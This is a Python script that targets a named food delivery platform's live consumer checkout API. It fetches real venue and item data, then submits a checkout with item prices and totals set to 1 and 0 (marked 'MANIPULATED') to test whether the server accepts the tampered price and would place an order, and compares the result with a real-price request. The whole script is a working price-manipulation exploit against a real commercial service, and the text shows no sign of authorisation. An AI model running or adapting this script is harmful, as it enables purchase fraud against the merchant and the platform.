"""Verify if price manipulation leads to actual order placement."""
import requests, json

h = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Origin': 'https://wolt.com',
    'Content-Type': 'application/json',
}

# Step 1: Get venue data to build a realistic checkout payload
venue_slug = 'wolt-market-kamppi'
r = requests.get(
    f'https://consumer-api.wolt.com/order-xp/web/v1/venue/slug/{venue_slug}/dynamic/',
    params={'selected_delivery_method': 'homedelivery'},
    headers=h
)
vd = r.json()
venue_id = vd['venue_raw']['id']
items = vd.get('items', [])
menu_items_data = vd['venue_raw'].get('menu', {}).get('items', []) if 'menu' in vd.get('venue_raw', {}) else []

print(f"Venue: {venue_id}, items: {len(items)}")

# Find a real item with full data
real_item = None
for item in items[:10]:
    if isinstance(item, dict) and 'id' in item:
        real_item = item
        break

if not real_item:
    print("No items found")
    exit()

real_price = real_item.get('price', 0) or real_item.get('baseprice', 306)
real_name = real_item.get('title', 'Unknown')
item_id = real_item.get('id', '')
cat_id = real_item.get('category_id', 'test')
print(f"Real item: {real_name} ({item_id}) price={real_price}")

# Step 2: Build checkout payload with real schema
# From previous error messages we know the exact schema needed
checkout_body = {
    'basket_id': f'test-basket-{venue_id}',
    'base_price': 0,  # manipulated
    'end_amount': 0,  # manipulated
    'pickup': False,
    'scheduled_time': None,
    'delivery_location': {'lat': 60.168142, 'lon': 24.939986},
    'supplier_id': venue_id,
    'selected_delivery_method': 'homedelivery',
    'vendor': 'wolt',
    'shipping_method': 'homedelivery',
    'currency': 'EUR',
    'discount': 0,
    'discount_code': None,
    'items': [{
        'id': item_id,
        'name': real_name,
        'count': 1,
        'price': 1,  # MANIPULATED
        'options': [],
        'base_price': 1,  # MANIPULATED
        'end_amount': 0,  # MANIPULATED
        'category_id': cat_id,
        'exclude_from_discounts': False,
        'restrictions': []
    }],
    'purchase_plan': {
        'venue': {
            'id': venue_id,
            'country': 'FIN',
            'currency': 'EUR'
        },
        'delivery_method': 'homedelivery',
        'menu_items': [{
            'id': item_id,
            'name': real_name,
            'count': 1,
            'price': 1,
            'options': [],
            'base_price': 1,
            'end_amount': 0,
            'category_id': cat_id,
            'exclude_from_discounts': False,
            'restrictions': []
        }]
    }
}

r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                  headers=h, json=checkout_body)
print(f"\n=== CHECKOUT (manipulated price=1) ===")
print(f"Status: {r.status_code}")
if r.status_code == 200:
    d = r.json()
    pa = d.get('payable_amount', 'N/A')
    print(f"payable_amount: {pa}")
    # Look for place_order URL or next step
    print(f"Keys: {list(d.keys())[:15]}")
    # Check if there's a place_order action
    import json
    print(json.dumps({k: str(v)[:120] for k, v in d.items()}, indent=2)[:500])
elif r.status_code == 400:
    print(f"Error: {r.text[:300]}")
else:
    print(f"Body: {r.text[:200]}")

# Step 3: Compare with real price
checkout_body['base_price'] = real_price
checkout_body['end_amount'] = real_price
checkout_body['items'][0].update({'price': real_price, 'base_price': real_price, 'end_amount': real_price})
checkout_body['purchase_plan']['menu_items'][0].update({'price': real_price, 'base_price': real_price, 'end_amount': real_price})

r = requests.post('https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout',
                  headers=h, json=checkout_body)
print(f"\n=== CHECKOUT (real price={real_price}) ===")
print(f"Status: {r.status_code}")
if r.status_code == 200:
    d = r.json()
    pa = d.get('payable_amount', 'N/A')
    print(f"payable_amount: {pa}")
